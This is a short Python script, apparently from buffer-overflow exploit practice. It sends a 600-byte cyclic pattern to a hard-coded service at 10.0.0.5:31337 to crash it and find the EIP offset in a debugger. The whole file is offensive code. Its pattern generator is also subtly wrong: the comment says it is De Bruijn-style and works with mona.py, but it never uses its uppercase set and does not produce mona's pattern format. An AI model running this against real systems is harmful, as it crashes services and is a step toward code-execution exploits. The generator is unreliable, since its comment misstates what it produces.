import socket, sys

HOST, PORT = "10.0.0.5", 31337

def cyclic(size=600, n=4):
    # De Bruijn-style pattern generator (works with mona.py / pattern_offset)
    pattern, lower, upper, digits = "", "abcdefghijklmnopqrstuvwxyz", "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "0123456789"
    for a in lower:
        for b in lower:
            for c in lower:
                for d in digits:
                    if len(pattern) >= size:
                        return pattern[:size]
                    pattern += a + b + c + d
    return pattern[:size]

def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    payload = cyclic().encode()
    s.sendall(payload + b"\n")
    try:
        print("Response:", s.recv(1024))
    except socket.timeout:
        print("Service crashed as expected. Check EIP in the debugger.")
    s.close()

if __name__ == "__main__":
    main()
